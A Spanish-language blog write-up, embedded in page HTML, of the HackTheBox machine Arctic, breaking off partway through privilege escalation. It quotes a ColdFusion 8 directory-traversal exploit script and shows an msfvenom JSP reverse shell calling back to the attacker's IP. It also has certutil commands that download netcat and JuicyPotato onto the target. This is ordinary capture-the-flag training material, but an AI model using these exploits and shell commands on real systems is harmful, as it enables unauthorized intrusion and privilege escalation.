@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Maquina Arctic - htb writeup | Firtsmiracle blog</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Arctic - htb writeup | Firtsmiracle blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Arctic - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
+<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Arctic" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Arctic" />
+<meta property="og:site_name" content="Firtsmiracle blog" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-11T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png" />
+<meta property="twitter:title" content="Maquina Arctic - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-11T00:00:00+00:00","datePublished":"2023-04-11T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege.","headline":"Maquina Arctic - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Arctic"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Arctic"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Arctic - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-04-11">11 Apr 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Arctic/arctic.png" alt="Maquina Arctic - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a estar resolviendo la maquina <code>Arctic</code> de <code>hackthebox</code> que es una maquina <code>Windows</code> de dificultad <code>Facil</code>. Para explotar esta maquina abusaremos una vulnerabilidad de <code>Condfusion 8</code> que nos permitira realizar un <code>directory path traversal</code> y una vez conectados al <code>Coldfusion</code> nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo <code>jsp</code> malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario <code>administrator</code> nos aprovecharemos del privilegio <code>Seimpersonateprivilege</code>.</p>
+
+<p>Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Arctic
+❯ ls
+ Arctic
+</code></pre>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+</code></pre>
+
+<h2 id="enumeración">Enumeración <a href="#enumeración">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.11
+PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
+64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=168 ms
+
+--- 10.10.10.11 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 167.800/167.800/167.800/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde con un <code>ttl</code> de <code>127</code> correspondiente a una maquina <code>windows</code>, ahora procederemos a el scaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:49 GMT
+Initiating SYN Stealth Scan at 15:49
+Scanning 10.10.10.11 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.11
+Discovered open port 49154/tcp on 10.10.10.11
+Discovered open port 8500/tcp on 10.10.10.11
+Completed SYN Stealth Scan at 15:49, 26.54s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.11
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-04-11 15:49:10 GMT for 27s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+135/tcp   open  msrpc   syn-ack ttl 127
+8500/tcp  open  fmtp    syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
+           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)
+</code></pre>
+<p>Podemos ver puertos interesantes que se encuentran abiertos como <code>135 rpc</code> , <code>8500 fmtp</code> , <code>445 smb</code> y <code>49154 unknown - desconocido</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p 135,8500,49154 10.10.10.11 -oN targets
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:51 GMT
+Nmap scan report for 10.10.10.11
+Host is up (0.29s latency).
+
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 147.62 seconds
+</code></pre>
+<p>Visulizamos la versión de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>8500</td>
+      <td>FMTP?</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>49154</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Primero ya que <code>nmap</code> no detecto el servicio del puerto <code>8500</code> en vista que nos pregunta si es <code>fmtp?</code>, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio.</p>
+
+<p>Vamos al navegador y veamos si el servicio es <code>http</code>, nos tarda un poco pero efectivamente si es un servicio web.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc1.PNG" alt="" /></p>
+
+<p>Dentro del dicrectorio <code>CFIDE</code> vemos nuevos directorios interesantes.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc2.PNG" alt="" /></p>
+
+<p>Si ahora vamos al direcotrio <code>administrator</code>, vemos un panel administrativo de <code>Adobe Coldfusion 8</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc3.PNG" alt="" /></p>
+
+<p>Seguidamente veamos con <code>searchsploit</code> si existen vulnerabilidades asociadas a <code>Adobe coldfusion</code>.</p>
+
+<pre><code class="language-bash">❯ searchsploit adobe coldfusion
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                  | cfm/webapps/36067.txt
+Adobe ColdFusion - Directory Traversal                                                                                                               | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
+Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
+Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
+Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
+Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                    | cfm/webapps/29567.txt
+Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                   | cfm/webapps/36172.txt
+Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
+Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                            | windows/webapps/27755.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                               | multiple/remote/30210.rb
+Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
+Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                            | multiple/remote/24946.rb
+Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Vemos que hay varias vulnerabilidades asociadas como una concreta <code>Adobe ColdFusion 8 - Remote Command Execution (RCE)</code>, que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con <code>Adobe ColdFusion - Directory Traversal</code>.</p>
+
+<p>Pasemos a inspeccionar ese exploit y veamos en que consiste.</p>
+
+<pre><code class="language-bash">❯ searchsploit -x multiple/remote/14641.py
+</code></pre>
+
+<p>Veamos de que trata el exploit</p>
+
+<pre><code class="language-python"># Working GET request courtesy of carnal0wnage:
+# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+#
+# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"
+
+
+#!/usr/bin/python
+
+# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
+# detailed information about the exploitation of this vulnerability:
+# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+
+# leo 13.08.2010
+
+import sys
+import socket
+import re
+
+# in case some directories are blocked
+filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")
+
+post = """POST %s HTTP/1.1
+Host: %s
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: %d
+
+locale=%%00%s%%00a"""
+
+def main():
+    if len(sys.argv) != 4:
+        print "usage: %s &lt;host&gt; &lt;port&gt; &lt;file_path&gt;" % sys.argv[0]
+        print "example: %s localhost 80 ../../../../../../../lib/password.properties" % sys.argv[0]
+        print "if successful, the file will be printed"
+        return
+
+    host = sys.argv[1]
+    port = sys.argv[2]
+    path = sys.argv[3]
+
+    for f in filenames:
+        print "------------------------------"
+        print "trying", f
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, int(port)))
+        s.send(post % (f, host, len(path) + 14, path))
+
+        buf = ""
+        while 1:
+            buf_s = s.recv(1024)
+            if len(buf_s) == 0:
+                break
+            buf += buf_s
+
+        m = re.search('&lt;title&gt;(.*)&lt;/title&gt;', buf, re.S)
+        if m != None:
+            title = m.groups(0)[0]
+            print "title from server in %s:" % f
+            print "------------------------------"
+            print m.groups(0)[0]
+            print "------------------------------"
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p>Podemos ver que esta realizando una petición a <code>http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+</code> para extraer un archivo local.</p>
+
+<p>Hagamos eso entonces y en el navegador agreguemos esa petición.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc4.PNG" alt="" /></p>
+
+<p>Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.</p>
+
+<ul>
+  <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+</ul>
+
+<p>Logramos obtener la contraseña en texto plano</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc5.PNG" alt="" /></p>
+
+<p>Ahora que ya contamos de credenciales validas <code>admin:happyday</code>, vamos a logearnos en el panel.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc6.PNG" alt="" /></p>
+
+<blockquote>
+  <p>Una vez ganes acceso a un <code>coldfusion</code> y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso.</p>
+</blockquote>
+
+<p>Podemos ir a las opciones de <code>schedule task</code> para crear una nueva tarea y a <code>mappings</code> para ver las rutas expuestas.</p>
+
+<p>En <code>mappings</code> podemos ver dos rutas expuestas. Siendo una de ellas <code>C:\ColdFusion8\wwwroot\CFIDE</code>, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc7.PNG" alt="" /></p>
+
+<p>Si ahora nos vamos a <code>schedule task</code>, podemos crear una tarea programada le damo un nombre. Y la idea es que en <code>URL</code> podemos emplear un archivo de una fuente que le indiquemos y en <code>File</code> podemos guardar ese contenido en una ruta dada.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc8.PNG" alt="" /></p>
+
+<p>Ahora que tipo de archivos podemos emplear para realizar esto:</p>
+
+<p>Pues si investigamos un poco acerca de <code>coldfusion</code> vemos que trabajan con archivos <code>asp</code>, <code>jsp</code> o <code>php</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc9.PNG" alt="" /></p>
+
+<p>Asi que vamos a intentar crear un archivo <code>JSP</code> malicioso, para ello usaremos <code>msfvenom</code></p>
+
+<pre><code class="language-bash">❯ msfvenom -l payloads | grep jsp
+    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
+    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
+</code></pre>
+
+<p>Vemos que tenemos un <code>payload</code> para otorgarnos una <code>shell</code>, asi que usaremos este payload <code>java/jsp_shell_reverse_tcp</code> y especificamos nuestra <code>ip</code> de atacante y el puerto en el cual estaremos en escucha que sera el <code>443</code>.</p>
+
+<pre><code class="language-bash">❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -o reverse.jsp
+Payload size: 1495 bytes
+Saved as: reverse.jsp
+❯ ls
+ reverse.jsp
+</code></pre>
+<p>Una vez tengamos listo el archivo malicioso, vamos a crear la tarea programada.</p>
+
+<p>Espeficamos el nombre que queramos de la tarea <code>pwnarctic</code>, en <code>url</code> le indicamos que se conecte a nuestro equipo con el archivo <code>reverse.jsp</code> que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos <code>C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc10.PNG" alt="" /></p>
+
+<p>Realizamos el <code>submit</code></p>
+
+<p>Lo siguiente sera compartirnos el archivo <code>reverse.jsp</code> en nuestro equipo, lo haremos con <code>python</code></p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+</code></pre>
+<p>Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de <code>actions</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc11.PNG" alt="" /></p>
+
+<p>y vemos que recibo la petición en mi maquina</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.11 - - [11/Apr/2023 17:15:00] "GET /reverse.jsp HTTP/1.1" 200 -
+</code></pre>
+
+<p>Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el <code>reverse.jsp</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Arctic/arc12.PNG" alt="" /></p>
+
+<p>Quiere decir que si ahora pinchamos en el archivo <code>reverse.jsp</code> al interpretarme el servidor el archivo <code>jsp</code>, deberiamos ganar acceso al sistema.</p>
+
+<p>Le damos y con <code>ncat</code> nos ponemos en escucha en el puerto <code>443</code>, tambien haciendo uso de <code>rlwrap</code> para obtener una consola mas interactiva.</p>
+
+<pre><code class="language-bash">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+</code></pre>
+
+<p>Esperamos unos segundos y ganamos acceso al sistema como el usuario <code>tolis</code></p>
+
+<pre><code class="language-cmd">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.11.
+Ncat: Connection from 10.10.10.11:49672.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+whoami
+whoami
+arctic\tolis
+</code></pre>
+<p>Si ahora nos vamos a la raiz del sistema y buscamos la primera flag de forma recursiva, vemos que se encuentra en el direcotrio personal del usuario, la leemos y habriamos obtenido la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-cmd">cd C:\
+cd C:\
+
+dir /r /s user.txt
+dir /r /s user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is 5C03-76A8
+
+ Directory of C:\Users\tolis\Desktop
+
+13/04/2023  02:35                 34 user.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               1 File(s)             34 bytes
+               0 Dir(s)   1.434.173.440 bytes free
+
+type C:\Users\tolis\Desktop\user.txt
+type C:\Users\tolis\Desktop\user.txt
+b2d38d2f34b46b4189d147c805813fa4
+</code></pre>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Veamos que privilegios tenemos como el usuario <code>tolis</code>, para ello usaremos el comando <code>whoami /priv</code></p>
+
+<pre><code class="language-cmd">whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre>
+
+<p>Tenemos habilitado el <code>seImpersonatePrivilege</code>, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda:</p>
+
+<p>Primero vamos a descargarnos el <code>JuicyPotato</code> del repositorio de <code>github</code></p>
+
+<ul>
+  <li><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></li>
+</ul>
+
+<p>Nos vamos a los releases y concretamente nos descargamos el <code>juicyPotato.exe</code></p>
+
+<p>Ahora nos vamos a descargar el ejecutable de <code>ntcat</code> para <code>windowns</code> del siguiente enlace, concretamente la versión <code>1.12</code>, debemos descomprimirlo y usar el <code>nc.64.exe</code></p>
+
+<ul>
+  <li><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></li>
+</ul>
+
+<p>Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima</p>
+
+<pre><code class="language-bash">❯ ls
+ JuicyPotato.exe   nc64.exe   reverse.jsp
+</code></pre>
+
+<p>Para subirlos nos compartiremos un servicio con <code>python3</code> y en la maquina victima haremos uso de <code>certutil.exe</code>, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como <code>C:\Windows\Temp</code></p>
+
+<pre><code class="language-cmd">cd C:\Windows\Temp
+cd C:\Windows\Temp
+
+mkdir Privesc
+mkdir Privesc
+
+cd Privesc
+cd Privesc
+
+C:\Windows\Temp\Privesc&gt;
+</code></pre>
+
+<p>Ejecutamos <code>certutil.exe</code></p>
+
+<pre><code class="language-cmd">certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
+certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
+****  Online  ****
+  0000  ...
+  b0d8
+CertUtil: -URLCache command completed successfully.
+
+certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
+certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
+****  Online  ****
+  000000  ...
+  054e00
+CertUtil: -URLCache command completed successfully.
+
+C:\Windows\Temp\Privesc&gt;
+</code></pre>
+
+<p>y recibimos la petición en nuestra maquina</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.11 - - [11/Apr/2023 17:59:47] "GET /nc64.exe HTTP/1.1" 200 -
+10.10.10.11 - - [11/Apr/2023 17:59:50] "GET /nc64.exe HTTP/1.1" 200 -
+10.10.10.11 - - [11/Apr/2023 18:00:02] "GET /JuicyPotato.exe HTTP/1.1" 200 -
+10.10.10.11 - - [11/Apr/2023 18:00:04] "GET /JuicyPotato.exe HTTP/1.1" 200 -
+</code></pre>
+
+<p>Verificamos que los archivos se subieron correctamente.</p>
+
+<pre><code class="language-cmd">dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C03-76A8
+
+ Directory of C:\Windows\Temp\Privesc
+
+13/04/2023  04:57     &lt;DIR&gt;          .
+13/04/2023  04:57     &lt;DIR&gt;          ..
+13/04/2023  04:57            347.648 JuicyPotato.exe
+13/04/2023  04:57             45.272 nc64.exe
+               2 File(s)        392.920 bytes
+               2 Dir(s)   1.432.981.504 bytes free
+
+C:\Windows\Temp\Privesc&gt;
+</code></pre>
+
+<p>Como ya tenemos ambos archivos, la idea es ahora que con el <code>JuicyPotato.exe</code> podemos inyectar comandos de manera privilegiada.</p>
+
+<pre><code class="language-cmd">.\JuicyPotato.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+-t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both
+-p &lt;program&gt;: program to launch
+-l &lt;port&gt;: COM server listen port
+
+
+Optional args: 
+-m &lt;ip&gt;: COM server listen address (default 127.0.0.1)
+-a &lt;argument&gt;: command line argument to pass to program (default NULL)
+-k &lt;ip&gt;: RPC server ip address (default 127.0.0.1)
+-n &lt;port&gt;: RPC server listen port (default 135)
+-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+-z only test CLSID and print token's user
+
+C:\Windows\Temp\Privesc&gt;
+</code></pre>
+
+<p>Procedemos a ejecutarlo con los parametros necesarios:</p>
+
+<ul>
+  <li>Con <code>-t</code> que es para crear un proceso vamos a usar <code>*</code> para usar las dos opciones</li>
+  <li>Con <code>-l</code> un puerto (puede ser el que quieras)</li>
+  <li>Con <code>-p</code> vamos a ejecutar un programa, que en nuestro caso sera la <code>cmd.exe</code> para atraves de ella ejecutar un comando privilegiado</li>
